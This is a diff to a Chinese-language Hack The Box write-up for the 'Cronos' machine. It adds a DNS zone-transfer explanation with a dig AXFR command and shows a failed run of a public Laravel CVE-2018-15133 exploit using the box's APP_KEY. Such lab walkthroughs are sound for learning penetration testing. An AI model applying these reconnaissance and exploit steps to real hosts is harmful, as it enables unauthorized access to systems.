@@ -1,3 +1,6 @@
+# 免责声明
+>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责
+
 # 探测
 
 开放端口
@@ -59,7 +62,23 @@ Nmap done: 1 IP address (1 host up) scanned in 18.89 seconds
 80端口没有任何有用的信息
 
 
-## vhost
+# 域传送漏洞
+
+什么是域传送？
+> DNS主备服务器会通过DNS域传送来进行数据库的同步。域传送是指后备服务器从主服务器复制数据，并用得到的数据更新自身数据库
+
+
+什么是域传送漏洞?
+> DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞，也就是说，攻击者可以利用这个漏洞来获取该DNS中记录的敏感信息
+
+利用格式：
+linux下
+```
+dig @目标DNS服务器ip axfr 查询的域名
+```
+
+看[这里](https://www.mi1k7ea.com/2021/04/03/%E6%B5%85%E6%9E%90DNS%E5%9F%9F%E4%BC%A0%E9%80%81%E6%BC%8F%E6%B4%9E/)
+
 靶机开启了DNS服务
 
 使用dig命令挖掘靶机域名
@@ -255,7 +274,6 @@ root
 ## CVE-2018-15133
 
 
-
 我们上面怀疑一个laravel存在一个rce，但是缺少一个.env文件
 
 来到项目目录
@@ -334,7 +352,20 @@ PUSHER_APP_SECRET=
 
 ```
 
-确认laravel版本为5.4，存在```CVE-2018-15133```漏洞
+
+使用github上这个[exp](https://github.com/aljavier/exploit_laravel_cve-2018-15133)
+
+无法执行
+```
+┌──(root💀kali)-[~/htb/cronos/exploit_laravel_cve-2018-15133-main]
+└─# python3 pwn_laravel.py 'http://cronos.htb' '+fUFGL45d1YZYlSTc0Sm71wPzJejQN/K6s9bHHihdYE=' -c id
+
+
+
+```
+
+
+查看composer.json确认laravel版本为5.4.x，而上面exp要求的版本是```In Laravel Framework through 5.5.40 and 5.6.x through 5.6.29```
 ```
 cat composer.json
 {
@@ -356,14 +387,3 @@ cat composer.json
 
 ```
 
-
-使用github上这个[exp](https://github.com/aljavier/exploit_laravel_cve-2018-15133)
-
-但是好像无法执行，很奇怪。。。
-```
-┌──(root💀kali)-[~/htb/cronos/exploit_laravel_cve-2018-15133-main]
-└─# python3 pwn_laravel.py 'http://cronos.htb' '+fUFGL45d1YZYlSTc0Sm71wPzJejQN/K6s9bHHihdYE=' -c id
-
-
-
-```
